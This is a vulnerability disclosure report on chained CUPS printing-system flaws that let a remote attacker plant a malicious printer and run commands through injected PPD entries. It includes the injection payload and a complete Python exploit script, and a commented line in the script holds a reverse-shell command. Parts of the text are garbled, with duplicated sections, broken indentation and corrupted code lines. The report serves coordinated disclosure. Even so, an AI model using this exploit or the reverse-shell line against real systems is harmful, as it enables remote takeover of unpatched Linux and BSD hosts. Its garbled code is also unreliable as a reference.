# Cups CVE2024

````
Original report

* Affected Vendor: OpenPrinting 
* Affected Product: Several components of the CUPS printing system: cups-browsed, libppd, libcupsfilters and cups-filters.
* Affected Version: All versions <= 2.0.1 (latest release) and master.
* Significant ICS/OT impact? no
* Reporter: Simone Margaritelli [evilsocket@gmail.com]
* Vendor contacted? yes The vendor has been notified trough Github Advisories and all bugs have been confirmed:

- https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8
- https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5
- https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6
- https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47

I'm also in contact with the Canonical security team about these issues.
Description The vulnerability affects many GNU/Linux distributions:

https://pkgs.org/download/cups-browsed

Google ChromeOS:

https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/master/net-print/cups-filters/cups-filters-1.28.5.ebuild#137

Most BSDs:

https://man.freebsd.org/cgi/man.cgi?query=cups-browsed.conf&sektion=5&apropos=0&manpath=FreeBSD+13.2-RELEASE+and+Ports

And possibly more.

---

A series of bugs in the CUPS printers discovery mechanism (`cups-browsed`) and in other components of the CUPS system, can be chained together to allow a remote attacker to automatically install a malicious printer (or hijack an existing one via mDNS) to execute arbitrary code on the target host as the `lp` user when a print job is sent to it.

As a reference useful to understand what follows, the main flow is:

0. cups-browsed discovers a printer either via UDP probe or DNS-SD.
1. it connects to the IPP server reported by the advertisement and fetches its properties.
2. these properties are saved to a temporary PPD file used to describe the printer to the rest of the system.

The following report explains how to exploit this in order force the service to write user controlled data to the temporary file and ultimately achieving code execution via network request.

I'm attaching a cups.mp4 video of a the full remote code execution chain against cups-browsed 2.0.1 on Ubuntu 24.04.1 LTS.

### Forcing it to connect to a malicious IPP server via discovery

The `cups-browsed` component is responsible for discovering printers on a network and adding them to the system. In order to do so, the service uses two distinct protocols.

For the first one, the service binds on all interfaces on UDP port 631 and accepts a custom packet from any untrusted source (bug number 1):

https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L13992

This is the first and most severe attack vector as it's exploitable from outside the LAN if the computer is exposed on the public internet ( https://www.shodan.io/search?query=port%3A631+product%3A%22CUPS+%28IPP%29%22 ).

The service also listens for DNS-SD / mDNS advertisements trough AVAHI:

https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L11576

In both cases, when a printer is discovered by either the UDP packet or mDNS, its IPP or IPPS url is **automatically** contacted by cups-browsed and a `Get-Printer-Attributes` request is sent to it:

https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L3994 

And, among other things, leaks its kernel version via `User-Agent` header:

![leak](https://github.com/user-attachments/assets/914c6935-8176-4df8-87e4-0406f072af64)

### Returning malicious IPP attributes

Please note that it is enough for the IPP server to respond with a valid response in order for the printer to be added to the system and, if discovered via mDNS, an existing printer can be directly hijacked (its IPP url replaced with a malicious one) making it indistinguishable from the original one. 

Most importantly (bug number 2) note that the `cfGetPrinterAttributes` API does not perform any sanitization on any of the IPP attributes returned by the server. Attributes that are then saved, as they are, in a temporary PPD file via `ppdCreatePPDFromIPP2`:

https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L8628

It is also possible to note how `ppdCreatePPDFromIPP2` doesn't perform any sanitization itself and in fact it just writes to the file any attributes contents:

https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L353

This allows an attacker (see attached PoC) to return a malicious IPP attribute in the form of (`printer-privacy-policy-uri` is just one of the several attributes that can be used, the RCE was also confirmed with `printer-info`, `printer-name` and `printer-make-and-model`):

```
printer-privacy-policy-uri = https://www.google.com/%22%5Cn*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip
```

Notice the double quote and the new line, this will result in the following PPD snippet:

```
...
*cupsPrivacyURI: "https://www.google.com/"
*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
...
```

This will set the `cupsPrivacyURI` to a valid value but also add the `FoomaticRIPCommandLine` and `cupsFilter2` entries. Also notice the space between `culsFilter2` and the semicolon - its purpose is to bypass these trivial checks:

https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L8939

### Command execution

These two lines:

```
*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
```

Essentially tell the CUPS system to execute the `foomatic-rip` filter binary when a print job is sent to this printer.

The `FoomaticRIPCommandLine` is then used to exploit a vulnerablity that was already patched:

[https://nvd.nist.gov/vuln/detail/CVE-2011-2964]

[https://nvd.nist.gov/vuln/detail/CVE-2011-2964]

fix: https://github.com/Distrotech/foomatic-filters/commit/20f05ab502d9e7a5bef58de16eca82d3745a7ad9

However, the fix is **not** present in `foomatic-rip/foomaticrip.c`:

https://github.com/OpenPrinting/cups-filters/blob/master/filter/foomatic-rip/foomaticrip.c#L983

As it is possible to see from the handling of the `--ppd` argument that was not removed as in the foomatic-filters fix.

This is a 13 years old vulnerability which fix has never been ported to this library that now replaced it:

- https://dilfridge.blogspot.com/2013/12/foomatic-is-moving-into-cups-filters.html
- https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters

> Some time ago the cups-filters maintainers took over maintainership of the foomatic-filters part for CUPS as well, and integrated it cleanly into cups- filters. That's the reason for the blocker; recent cups-filters contain the newest foomatic code available. The former separate foomatic-filters package is now unmaintained.

In short, by relying on the fact that FoomaticRIPCommandLine can be used to execute ANY command, that IPP attributes are never sanitized and that the discovery mechanism trusts blindly anything coming from *:631 or mDNS, we achieve remote command execution on the system when a print job is triggered.

## How does an attacker exploit this vulnerability?

An attacker can exploit this vulnerability if it can connect to the host via UDP port 631, which is by default bound to INADDR_ANY, in which case the attack can be entirely remote, or if it's on the same network of the target, by using mDNS advertisements.

## What does an attacker gain by exploiting this vulnerability?

Remote execution of arbitrary commands when a print job is sent to the system printer.

## How was the vulnerability discovered?

A lot of curiosity (when I noticed the *:631 UDP bind I was like "wtf is this?!" and went down a rabbit hole ...) and good old source code auditing.

## Is this vulnerability publicly known?

No, the bugs are not known and the FoomaticRIPCommandLine vulnerability is known to be already patched (it isn't).

## Is there evidence that this vulnerability is being actively exploited?

Not to the best of my knowledge.

## Do you plan to publicly disclose this vulnerability yourself?

Yes, I already agreed on a 30 days disclosure embargo with the vendor, which will end on October 6. I'm open to extending it if anyone needs more time.

* https://dilfridge.blogspot.com/2013/12/foomatic-is-moving-into-cups-filters.html
* https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters

> Some time ago the cups-filters maintainers took over maintainership of the foomatic-filters part for CUPS as well, and integrated it cleanly into cups- filters. That's the reason for the blocker; recent cups-filters contain the newest foomatic code available. The former separate foomatic-filters package is now unmaintained.

In short, by relying on the fact that FoomaticRIPCommandLine can be used to execute ANY command, that IPP attributes are never sanitized and that the discovery mechanism trusts blindly anything coming from *:631 or mDNS, we achieve remote command execution on the system when a print job is triggered.

I'm attaching the exploit code, it uses the ippserver package ( [https://github.com/h2g2bob/ipp-server] ), run as `exploit.py ATTACKER_EXTERNAL_IP TARGET_IP`, will create the `/tmp/I_AM_VULNERABLE` file on the target machine when a print job is started:

```python
#!/usr/bin/env python3
import socket
import threading
import time
import sys


from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
	OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest


class MaliciousPrinter(behaviour.StatelessPrinter):
	def __init__(self, command):
		self.command = command
		super(MaliciousPrinter, self).__init__()

def minimal_attributes(self):
	return {
		# This list comes from
		# [https://tools.ietf.org/html/rfc2911]
		# Section 3.1.4.2 Response Operation Attributes
		(
			SectionEnum.operation,
			b'attributes-charset',
			TagEnum.charset
		): [b'utf-8'],
		(
			SectionEnum.operation,
			b'attributes-natural-language',
			TagEnum.natural_language
		): [b'en'],
	}

def printer_list_attributes(self):
	attr = {
		# rfc2911 section 4.4
		(
			SectionEnum.printer,
			b'printer-uri-supported',
			TagEnum.uri
		): [self.printer_uri],
		(
			SectionEnum.printer,
			b'uri-authentication-supported',
			TagEnum.keyword
			): [b'none'],
		(
			SectionEnum.printer,
			b'uri-security-supported',
			TagEnum.keyword
		): [b'none'],
		(
			SectionEnum.printer,
			b'printer-name',
			TagEnum.name_without_language
		): [b'Main Printer'],
		(
			SectionEnum.printer,
			b'printer-info',
			TagEnum.text_without_language
		): [b'Main Printer Info'],
		(
			SectionEnum.printer,
			b'printer-make-and-model',
			TagEnum.text_without_language
		): [b'HP 0.00'],
		(
			SectionEnum.printer,
			b'printer-state',
			TagEnum.enum
		): [Enum(3).bytes()], # XXX 3 is idle
		(
			SectionEnum.printer,
			b'printer-state-reasons',
			TagEnum.keyword
		): [b'none'],
		(
			SectionEnum.printer,
			b'ipp-versions-supported',
			TagEnum.keyword
		): [b'1.1'],
		(
			SectionEnum.printer,
			b'operations-supported',
			TagEnum.enum
		): [
			Enum(x).bytes()
			for x in (
			OperationEnum.print_job, # (required by cups)
			OperationEnum.validate_job, # (required by cups)
			OperationEnum.cancel_job, # (required by cups)
			OperationEnum.get_job_attributes, # (required by cups)
			OperationEnum.get_printer_attributes,
		)],
		(
			SectionEnum.printer,
			b'multiple-document-jobs-supported',
			TagEnum.boolean
		): [Boolean(False).bytes()],
		(
			SectionEnum.printer,
			b'charset-configured',
			TagEnum.charset
		): [b'utf-8'],
		(
			SectionEnum.printer,
			b'charset-supported',
			TagEnum.charset
		): [b'utf-8'],
		(
			SectionEnum.printer,
			b'natural-language-configured',
			TagEnum.natural_language
		): [b'en'],
		(
			SectionEnum.printer,
			b'generated-natural-language-supported',
			TagEnum.natural_language
		): [b'en'],
		(
			SectionEnum.printer,
			b'document-format-default',
			TagEnum.mime_media_type
		): [b'application/pdf'],
		(
			SectionEnum.printer,
			b'document-format-supported',
			TagEnum.mime_media_type
		): [b'application/pdf'],
		(
			SectionEnum.printer,
			b'printer-is-accepting-jobs',
			TagEnum.boolean
		): [Boolean(True).bytes()],
		(
			SectionEnum.printer,
			b'queued-job-count',
			TagEnum.integer
		): [Integer(666).bytes()],
		(
			SectionEnum.printer,
			b'pdl-override-supported',
			TagEnum.keyword
		): [b'not-attempted'],
		(
			SectionEnum.printer,
			b'printer-up-time',
			TagEnum.integer
		): [Integer(self.printer_uptime()).bytes()],
		(
			SectionEnum.printer,
			b'compression-supported',
			TagEnum.keyword
		): [b'none'],
		(
			SectionEnum.printer,
			b'printer-privacy-policy-uri',
			TagEnum.uri
		): [b'https//www.google.com/%22%5Cn*FoomaticRIPCommandLine: "' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
	}
	attr.update(self.minimal_attributes())
	return attr

def operation_printer_list_response(self, req, _psfile):
	print("target connected, sending payload ...")
	attributes = self.printer_list_attributes()
	return IppRequest(
		self.version,
		StatusCodeEnum.ok,
		req.request_id,
		attributes
	)


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
	print("sending udp packet to %s:%d ..." % (ip, port))

	printer_type = 0x00
	printer_state = 0x03
	printer_uri = 'http://%s:%d/printers/NAME' % (
		ipp_server_host, ipp_server_port
	)
	printer_location = 'Office HQ'
	printer_info = 'Printer'

	message = bytes('%x %x %s "%s" "%s"' % (
		printer_type,
		printer_state,
		printer_uri,
		printer_location,
		printer_info), 'UTF-8'
	)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.sendto(message, (ip, port))


def wait_until_ctrl_c():
	try:
		while True:
		printer_uptimetime.sleep(300)
	except KeyboardInterrupt:
		return


def run_server(server):
	print('malicious ipp server listening on ', server.server_address)
	server_thread = threading.Thread(target=server.serve_forever)
	server_thread.daemon = True
	server_thread.start()
	wait_until_ctrl_c()
	server.shutdown()


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
		quit()

	SERVER_HOST = sys.argv[1]
	SERVER_PORT = 12345

	# "sh -c \'echo $(uname -a) > /tmp/GOD\'"
	# ncat -e /bin/sh 192.168.50.19 4242

	command = "echo 1 > /tmp/I_AM_VULNERABLE"

	server = IPPServer((SERVER_HOST, SERVER_PORT),
	IPPRequestHandler, MaliciousPrinter(command))

	threading.Thread(
		target=run_server,
		args=(server, )
	).start()

	TARGET_HOST = sys.argv[2]
	TARGET_PORT = 631
	send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

	print("wating ...")

	while True:
		time.sleep(1.0)

```

Exploit: An attacker can exploit this vulnerability if it can connect to the host via UDP port 631, which is by default bound to INADDR_ANY, in which case the attack can be entirely remote, or if it's on the same network of the target, by using mDNS advertisements.

Impact: Remote execution of arbitrary commands when a print job is sent to the system printer.

Discovery: A lot of curiosity (when I noticed the *:631 UDP bind I was like "wtf is this?!" and went down a rabbit hole ...) and good old source code auditing.

Has been exploited? no

Is public? no{quote}

Disclosure Plans? yes
````
